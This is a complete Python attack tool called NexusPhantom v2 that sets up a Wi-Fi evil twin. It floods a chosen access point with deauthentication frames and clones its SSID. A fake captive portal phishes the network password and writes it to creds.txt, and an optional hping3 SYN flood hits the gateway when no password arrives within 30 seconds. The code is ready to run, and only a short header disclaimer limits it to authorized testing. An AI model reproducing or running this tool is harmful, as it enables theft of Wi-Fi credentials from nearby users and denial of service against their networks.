#!/usr/bin/env python3
"""
================================================================================
 NEXUSPHANTOM v2 - EVIL TWIN WITH DEAUTH + DOS FALLBACK
================================================================================
LEGAL: For authorized security testing ONLY.
       You must have explicit written permission to test any network.
================================================================================
WARNING: DoS attacks are illegal in most jurisdictions. Use ONLY in lab environments.
================================================================================
"""

import os
import sys
import time
import threading
import subprocess
import urllib.parse
import re
from http.server import HTTPServer, BaseHTTPRequestHandler

# ------------------------- ANSI -------------------------
GRN = "\033[92m"
RED = "\033[91m"
YLW = "\033[93m"
BLU = "\033[94m"
BOLD = "\033[1m"
RST = "\033[0m"
CLR = "\033[2J\033[H"

def sprint(txt, color=GRN):
    print(f"{color}{txt}{RST}")

def banner():
    print(CLR)
    print(f"""
{BOLD}{BLU}  ███╗   ██╗███████╗██╗  ██╗██╗   ██╗███████╗
  ████╗  ██║██╔════╝╚██╗██╔╝██║   ██║██╔════╝
  ██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║███████╗
  ██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║╚════██║
  ██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝███████║
  ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝{RST}
{BOLD}{GRN}    N E X U S   P H A N T O M   v 2 . 0{RST}
    """)
    sprint(f"{BOLD}[1] Scan Networks   [2] Deploy Evil Twin (Deauth + DoS Fallback){RST}")
    sprint(f"{BOLD}[3] Deauth Only      [0] Exit{RST}")
    print()

# ------------------------- Root Check -------------------------
def check_root():
    if os.geteuid() != 0:
        sprint("[!] Root required. Use: sudo python3 nexusphantom.py", RED)
        sys.exit(1)

# ------------------------- Interface Helpers -------------------------
def find_wireless_iface():
    try:
        out = subprocess.check_output(["iw", "dev"], text=True, stderr=subprocess.DEVNULL)
        for line in out.splitlines():
            if "Interface" in line:
                return line.split()[-1].strip()
    except:
        pass
    for iface in ["wlan0", "wlan1"]:
        if os.path.exists(f"/sys/class/net/{iface}"):
            return iface
    return None

def get_gateway_ip():
    """Get the router's IP address from the default route."""
    try:
        out = subprocess.check_output(["ip", "route", "show", "default"], text=True)
        parts = out.split()
        if "via" in parts:
            idx = parts.index("via") + 1
            return parts[idx]
    except:
        pass
    return "192.168.1.1"  # fallback

def get_default_route_iface():
    try:
        out = subprocess.check_output(["ip", "route", "show", "default"], text=True)
        parts = out.split()
        if "dev" in parts:
            return parts[parts.index("dev") + 1]
    except:
        pass
    return "eth0"

def create_monitor(phy_iface):
    subprocess.call(["airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        out = subprocess.check_output(["airmon-ng", "start", phy_iface], text=True, stderr=subprocess.DEVNULL)
        for line in out.splitlines():
            if "mon" in line and phy_iface in line:
                for p in line.split():
                    if "mon" in p:
                        return p.strip()
    except:
        pass
    mon = f"{phy_iface}mon"
    try:
        subprocess.check_call(["iw", "dev", phy_iface, "interface", "add", mon, "type", "monitor"],
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.check_call(["ip", "link", "set", mon, "up"])
        return mon
    except:
        return None

def stop_monitor(mon_iface):
    subprocess.call(["airmon-ng", "stop", mon_iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# ------------------------- Scan Networks -------------------------
def scan_networks():
    iface = find_wireless_iface()
    if not iface:
        sprint("[!] No wireless interface found.", RED)
        return []
    subprocess.call(["ip", "link", "set", iface, "up"])
    sprint(f"[+] Scanning on {iface}...")
    networks = []
    try:
        raw = subprocess.check_output(["iw", "dev", iface, "scan"], text=True, timeout=20, stderr=subprocess.DEVNULL)
        cur = {}
        for line in raw.splitlines():
            line = line.strip()
            if line.startswith("BSS "):
                if cur and "ssid" in cur and cur["ssid"]:
                    networks.append(cur)
                bssid_match = re.search(r'BSS ([0-9a-fA-F:]{17})', line)
                if bssid_match:
                    cur = {"bssid": bssid_match.group(1)}
                else:
                    cur = {}
            elif "SSID:" in line:
                ssid = line.split("SSID:", 1)[1].strip()
                if ssid:
                    cur["ssid"] = ssid
            elif "DS Parameter set:" in line:
                cur["ch"] = line.split("DS Parameter set:", 1)[1].strip()
            elif "signal:" in line:
                cur["sig"] = line.split("signal:", 1)[1].strip()
        if cur and "ssid" in cur and cur["ssid"]:
            networks.append(cur)
    except Exception as e:
        sprint(f"[!] Scan error: {e}", RED)
        return []
    if not networks:
        sprint("[!] No networks found.", YLW)
        return []
    sprint(f"\n{BOLD}{'ID':<6} {'SSID':<25} {'BSSID':<20} {'CH':<5} {'Signal':<12}{RST}")
    sprint("  " + "-"*70)
    for i, n in enumerate(networks):
        sprint(f"  [{i}] {n['ssid']:<25} {n['bssid']:<20} {n.get('ch','?'):<5} {n.get('sig','N/A'):<12}")
    return networks

# ------------------------- DEAUTH ENGINE -------------------------
def start_deauth_engine(target_bssid, target_channel, monitor_iface):
    """Start mdk4 or aireplay-ng for deauth."""
    subprocess.call(["iw", "dev", monitor_iface, "set", "channel", target_channel])
    try:
        subprocess.check_call(["which", "mdk4"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        sprint("[+] Using mdk4 – aggressive deauth.")
        p = subprocess.Popen([
            "mdk4", monitor_iface, "d",
            "-a", target_bssid,
            "-c", target_channel,
            "-s", "1024"
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return p
    except:
        sprint("[!] mdk4 not found. Falling back to aireplay-ng.", YLW)
        p = subprocess.Popen([
            "aireplay-ng", "--deauth", "0", "-a", target_bssid, monitor_iface
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return p

# ------------------------- DOS ENGINE -------------------------
def start_dos_attack(gateway_ip, out_iface, duration_sec=60):
    """
    Launch a SYN flood using hping3 against the gateway IP.
    This will saturate the router's internet connection.
    """
    sprint(f"[!] Starting DoS attack on gateway {gateway_ip} via {out_iface}", RED)
    try:
        p = subprocess.Popen([
            "hping3", "-S", "-p", "80", "--flood", gateway_ip,
            "-I", out_iface
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        def stop_after():
            time.sleep(duration_sec)
            p.terminate()
        threading.Thread(target=stop_after, daemon=True).start()
        return p
    except Exception as e:
        sprint(f"[!] DoS start failed: {e}", RED)
        return None

# ------------------------- Captive Portal -------------------------
class PortalHandler(BaseHTTPRequestHandler):
    target_ssid = "WiFi"

    def log_message(self, *args):
        pass

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        html = f"""<!DOCTYPE html>
<html><head><title>{self.target_ssid}</title>
<style>
body{{background:#0b1121;color:#e2e8f0;display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;}}
.card{{background:#1e293b;padding:2rem;border-radius:12px;max-width:400px;width:100%;}}
input,button{{width:100%;padding:0.75rem;margin:0.5rem 0;border-radius:6px;border:none;}}
input{{background:#0f172a;color:#fff;}}
button{{background:#22c55e;color:#fff;font-weight:bold;cursor:pointer;}}
</style>
</head>
<body>
<div class="card">
<h2>Network Authentication Required</h2>
<p>Enter the password for <b>{self.target_ssid}</b> to continue.</p>
<form method="POST">
<input type="password" name="psk" placeholder="Wi-Fi Password" required>
<button type="submit">Continue</button>
</form>
</div>
</body></html>
"""
        self.wfile.write(html.encode())

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        data = urllib.parse.parse_qs(self.rfile.read(length).decode())
        psk = data.get("psk", [""])[0]
        if psk:
            with open("creds.txt", "a") as f:
                f.write(f"[{time.ctime()}] SSID={self.target_ssid} KEY={psk}\n")
            sprint(f"\n[!!!] PASSWORD CAPTURED: {psk}", RED)
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        # FIXED: Removed non-ASCII checkmark from bytes literal.
        self.wfile.write(b"<html><body style='background:#0b1121;color:#fff;text-align:center;padding-top:20%'><h2>Connected</h2><p>You may now use the internet.</p></body></html>")

def start_portal(ssid, port=80):
    PortalHandler.target_ssid = ssid
    try:
        server = HTTPServer(("0.0.0.0", port), PortalHandler)
    except OSError:
        port = 8080
        server = HTTPServer(("0.0.0.0", port), PortalHandler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    sprint(f"[+] Portal running at http://0.0.0.0:{port}/")
    return server

# ------------------------- Evil Twin + Deauth + DoS Fallback -------------------------
def evil_twin_deauth_dos(networks):
    if not networks:
        sprint("[!] No networks. Run scan first.", RED)
        return

    try:
        choice = int(input(f"{GRN}[?] Target number: {RST}"))
        target = networks[choice]
    except:
        sprint("[!] Invalid selection.", RED)
        return

    sprint(f"\n{BOLD}TARGET: {target['ssid']} | BSSID: {target['bssid']} | CH: {target.get('ch','6')}{RST}")

    gateway_ip = get_gateway_ip()
    out_iface = get_default_route_iface()
    sprint(f"[+] Gateway IP: {gateway_ip} | Out interface: {out_iface}")

    phy_iface = find_wireless_iface()
    if not phy_iface:
        sprint("[!] No wireless interface.", RED)
        return

    ap_iface = phy_iface
    subprocess.call(["ip", "addr", "flush", "dev", ap_iface], stderr=subprocess.DEVNULL)
    subprocess.call(["ip", "link", "set", ap_iface, "down"])
    time.sleep(1)
    subprocess.check_call(["ip", "addr", "add", "10.0.0.1/24", "dev", ap_iface])
    subprocess.check_call(["ip", "link", "set", ap_iface, "up"])
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("1")

    subprocess.call(["iptables", "--flush"])
    subprocess.call(["iptables", "-t", "nat", "--flush"])
    subprocess.check_call(["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", out_iface, "-j", "MASQUERADE"])
    subprocess.check_call(["iptables", "-A", "FORWARD", "-i", ap_iface, "-o", out_iface, "-j", "ACCEPT"])
    subprocess.check_call(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", "10.0.0.1:80"])
    subprocess.check_call(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "443", "-j", "DNAT", "--to-destination", "10.0.0.1:80"])

    with open("/tmp/nexus_hostapd.conf", "w") as f:
        f.write(f"""interface={ap_iface}
driver=nl80211
ssid={target['ssid']}
hw_mode=g
channel={target.get('ch','6')}
wmm_enabled=0
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
""")
    with open("/tmp/nexus_dnsmasq.conf", "w") as f:
        f.write(f"""interface={ap_iface}
dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
listen-address=10.0.0.1
""")

    subprocess.call(["airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    p_dns = subprocess.Popen(["dnsmasq", "-C", "/tmp/nexus_dnsmasq.conf", "-d"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(1)
    p_ap = subprocess.Popen(["hostapd", "/tmp/nexus_hostapd.conf"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(2)

    mon_iface = create_monitor(phy_iface)
    p_deauth = None
    if mon_iface:
        sprint(f"[+] Monitor: {mon_iface}")
        p_deauth = start_deauth_engine(target['bssid'], target.get('ch','6'), mon_iface)
    else:
        sprint("[!] Monitor creation failed. Deauth skipped.", YLW)

    portal = start_portal(target['ssid'])

    dos_enabled = input(f"{YLW}[?] Enable DoS fallback if deauth fails? (y/n): {RST}").strip().lower() == 'y'
    p_dos = None
    dos_thread = None

    if dos_enabled:
        sprint("[+] DoS fallback enabled. Will launch after 30 seconds if no client appears.", YLW)

    sprint(f"\n{BOLD}{GRN}=== EVIL TWIN + DEAUTH + DOS FALLBACK ==={RST}")
    sprint(f"  AP: {target['ssid']} (fake)")
    sprint(f"  Portal: http://10.0.0.1:80")
    sprint(f"  Credentials: creds.txt")
    sprint(f"  Deauth: {'active' if p_deauth else 'disabled'}")
    sprint(f"  DoS fallback: {'enabled' if dos_enabled else 'disabled'}")
    sprint(f"\n {BOLD}Press Ctrl+C to stop all services.{RST}\n")

    def dos_worker():
        time.sleep(30)
        if dos_enabled:
            # Check if any credentials have been captured (creds.txt exists and not empty)
            try:
                with open("creds.txt", "r") as f:
                    content = f.read().strip()
                if content:
                    sprint("[+] Credentials captured! DoS not needed.", GRN)
                    return
            except:
                pass
            sprint("[!] No credentials captured in 30s. Launching DoS fallback...", RED)
            p_dos = start_dos_attack(gateway_ip, out_iface, duration_sec=120)
            if p_dos:
                time.sleep(120)
                p_dos.terminate()
                sprint("[+] DoS stopped.")

    if dos_enabled:
        dos_thread = threading.Thread(target=dos_worker, daemon=True)
        dos_thread.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        sprint("\n[!] Shutting down...", YLW)
        for p in [p_dns, p_ap, p_deauth]:
            if p:
                try: p.terminate()
                except: pass
        portal.shutdown()
        if mon_iface:
            stop_monitor(mon_iface)
        subprocess.call(["ip", "addr", "flush", "dev", ap_iface])
        subprocess.call(["ip", "link", "set", ap_iface, "down"])
        subprocess.call(["iptables", "--flush"])
        subprocess.call(["iptables", "-t", "nat", "--flush"])
        subprocess.call(["systemctl", "start", "NetworkManager"], stderr=subprocess.DEVNULL)
        sprint("[+] Cleanup complete.")

# ------------------------- Deauth Only -------------------------
def deauth_only():
    networks = scan_networks()
    if not networks:
        return
    try:
        choice = int(input(f"{GRN}[?] Target number: {RST}"))
        target = networks[choice]
    except:
        sprint("[!] Invalid.", RED)
        return

    iface = find_wireless_iface()
    if not iface:
        sprint("[!] No interface.", RED)
        return
    mon = create_monitor(iface)
    if not mon:
        sprint("[!] Monitor creation failed.", RED)
        return
    sprint(f"[+] Deauthing {target['bssid']} on channel {target.get('ch','6')}")
    p = start_deauth_engine(target['bssid'], target.get('ch','6'), mon)
    sprint(f"{BOLD}Deauth running. Press Ctrl+C to stop.{RST}")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        p.terminate()
        stop_monitor(mon)
        sprint("[+] Stopped.")

# ------------------------- Main -------------------------
def main():
    check_root()
    banner()
    networks = []
    while True:
        cmd = input(f"{GRN}nexus> {RST}").strip().lower()
        if cmd in ("1", "scan"):
            networks = scan_networks()
        elif cmd in ("2", "attack", "evil"):
            evil_twin_deauth_dos(networks)
        elif cmd in ("3", "deauth"):
            deauth_only()
        elif cmd in ("0", "exit"):
            sprint("Goodbye.")
            break
        else:
            sprint("Commands: 1 (scan), 2 (evil twin+deauth+dos), 3 (deauth only), 0 (exit)")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sprint("\nExited.")
    except Exception as e:
        sprint(f"Error: {e}", RED)
